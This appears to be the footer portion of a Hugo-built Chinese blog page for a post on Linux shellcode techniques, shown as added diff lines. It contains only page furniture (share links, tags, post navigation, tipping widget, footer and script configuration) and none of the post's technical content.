+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="分享到 X" data-sharer="twitter" data-url="https://roderickchan.github.io/zh-cn/2023-02-20-the-art-of-shellcode/" data-title="Linux下的shellcode技巧总结" data-hashtags="shellcode,pwn"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://roderickchan.github.io/zh-cn/2023-02-20-the-art-of-shellcode/" data-hashtag="shellcode"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://roderickchan.github.io/zh-cn/2023-02-20-the-art-of-shellcode/" data-title="Linux下的shellcode技巧总结"><i class="fa-brands fa-hacker-news fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://roderickchan.github.io/zh-cn/2023-02-20-the-art-of-shellcode/" data-title="Linux下的shellcode技巧总结"><svg class="icon" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>LINE</title><path d="M19.365 9.863c.349.0.63.285.63.631.0.345-.281.63-.63.63H17.61v1.125h1.755c.349.0.63.283.63.63.0.344-.281.629-.63.629h-2.386c-.345.0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63h2.386c.346.0.627.285.627.63.0.349-.281.63-.63.63H17.61v1.125h1.755zm-3.855 3.016c0 .27-.174.51-.432.596-.064.021-.133.031-.199.031-.211.0-.391-.09-.51-.25l-2.443-3.317v2.94c0 .344-.279.629-.631.629-.346.0-.626-.285-.626-.629V8.108c0-.27.173-.51.43-.595.06-.023.136-.033.194-.033.195.0.375.104.495.254l2.462 3.33V8.108c0-.345.282-.63.63-.63.345.0.63.285.63.63v4.771zm-5.741.0c0 .344-.282.629-.631.629-.345.0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63.346.0.628.285.628.63v4.771zm-2.466.629H4.917c-.345.0-.63-.285-.63-.629V8.108c0-.345.285-.63.63-.63.348.0.63.285.63.63v4.141h1.756c.348.0.629.283.629.63.0.344-.282.629-.629.629M24 10.314C24 4.943 18.615.572 12 .572S0 4.943.0 10.314c0 4.811 4.27 8.842 10.035 9.608.391.082.923.258 1.058.59.12.301.079.766.038 1.08l-.164 1.02c-.045.301-.24 1.186 1.049.645 1.291-.539 6.916-4.078 9.436-6.975C23.176 14.393 24 12.458 24 10.314"/></svg></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://roderickchan.github.io/zh-cn/2023-02-20-the-art-of-shellcode/" data-title="Linux下的shellcode技巧总结"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/zh-cn/tags/shellcode/" class="post-tag" title="标签 - shellcode">shellcode</a><a href="/zh-cn/tags/pwn/" class="post-tag" title="标签 - pwn">pwn</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/zh-cn/">主页</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/zh-cn/2023-02-15-%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AAlibc-database/" class="post-nav-item" rel="prev" title="自己搭建一个libc Database"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>自己搭建一个libc Database</a><a href="/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/" class="post-nav-item" rel="next" title="Glibc堆利用之house Of系列总结">Glibc堆利用之house Of系列总结<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div class="post-reward">
+    <div class="comment">Buy me a coffee~</div>
+    <input type="checkbox" class="reward-input" name="reward" id="fi-reward" hidden />
+    <label class="reward-button" for="fi-reward"><i class="fa-solid fa-qrcode fa-fw" aria-hidden="true"></i>赞赏</label>
+    <div class="reward-ways" data-mode="fixed"><div><img src='/images/alipay.jpg' alt="roderick 支付宝"><span data-animation>支付宝</span>
+          </div><div><img src='/images/wechatpay.jpg' alt="roderick 微信"><span data-animation>微信</span>
+          </div></div>
+  </div><div id="comments"><div id="waline" class="comment"></div><noscript>
+        Please enable JavaScript to view the comments powered by <a href="https://waline.js.org/" rel="external nofollow noopener noreferrer">Waline</a>.
+      </noscript></div></article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><div class="follow-container">
+    <a href="https://www.roderickchan.cn" class="author-link" target="_blank">
+      <img src="https://gravatar.loli.net/avatar/6f579d9b68b13aed76b08fee1c3ede40?s=32&amp;d=mp" alt="roderick" class="author-avatar"> roderick
+    </a>
+    <a href="https://github.com/RoderickChan" class="follow-btn" target="_blank" title="关注我的 GitHub！">
+      <i class="fa-brands fa-github fa-fw fa-beat" aria-hidden="true"></i> 关注
+    </a>
+  </div>
+  <hr class="hr-edge-weak"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="clustrmaps-custom">
+    <center>
+<script type='text/javascript' id='clustrmaps' src='//cdn.clustrmaps.com/map_v2.js?cl=ffffff&w=600&t=tt&d=bKrzPRSdAZuPQnsWUdvwNdyX5hI0m3cpvARXwWbJct4'></script>
+    </center>
+</div><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.147.7"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.21-87ca54d0"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="https://www.roderickchan.cn"target="_blank" rel="external nofollow noopener noreferrer">roderick</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span></div><div class="footer-line statistics"><span class="site-time" title='网站运行中……'><i class="fa-solid fa-heartbeat fa-fw animate-icon" aria-hidden="true"></i><span class="run-times ms-1">网站运行中……</span></span></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div><div class="footer-line beian"><span class="icp footer-divider"><a href="http://beian.miit.gov.cn/">鄂ICP备2022016286号</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><a href="https://github.com/RoderickChan" title="View source on GitHub"target="_blank" rel="external nofollow" class="github-corner right d-none-mobile"><svg viewBox="0 0 250 250" aria-hidden="true" width="56" height="56"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;--bg-progress: #000;--bg-progress-dark: #fff;"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/waline/waline.css"><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="preload" href="/lib/aplayer/APlayer.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/aplayer/APlayer.min.css"></noscript><link rel="stylesheet" href="/lib/aplayer/dark.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/waline/waline.umd.js" defer></script><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/algoliasearch/algoliasearch-lite.umd.min.js" defer></script><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/aplayer/APlayer.min.js" defer></script><script src="/lib/meting/Meting.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="https://vercount.one/js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"复制到剪贴板","maxShownLines":-1},"comment":{"enable":true,"expired":false,"waline":{"copyright":true,"dark":"html[data-theme='dark']","el":"#waline","emoji":["//unpkg.com/@waline/emojis@1.1.0/weibo"],"highlighter":true,"imageUploader":true,"lang":"zh-cn","login":"enable","meta":["nick","mail","link"],"pageSize":10,"reaction":true,"search":false,"serverURL":"https://waline.roderickchan.cn/","texRenderer":false}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"enablePWA":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"pangu":{"enable":true,"selector":"article"},"search":{"algoliaAppID":"6CJ87MRD62","algoliaIndex":"index.zh-cn","algoliaSearchKey":"9f68a62dba71402a82f37137a7a886d2","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":30,"type":"algolia"},"siteTime":"2022-10-01T09:00:00+08:00","twemoji":true,"typeit":{"cursorChar":"|","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.21-87ca54d0","watermark":{"colspacing":30,"content":"roderick' blog","enable":true,"fontfamily":"inherit","fontsize":0.85,"height":21,"opacity":0.0125,"rotate":15,"rowspacing":60,"width":150}};</script><script src="/js/theme.min.js" defer></script><script src="/lib/translate.min.js" defer></script><script>window.ATConfig={"hugoLangCodes":["zh-CN"],"hugoLangMap":{"zh-CN":"/zh-cn/2023-02-20-the-art-of-shellcode/"}};</script><script src="/js/translate.fixit.min.js" defer></script></body>
+</html>
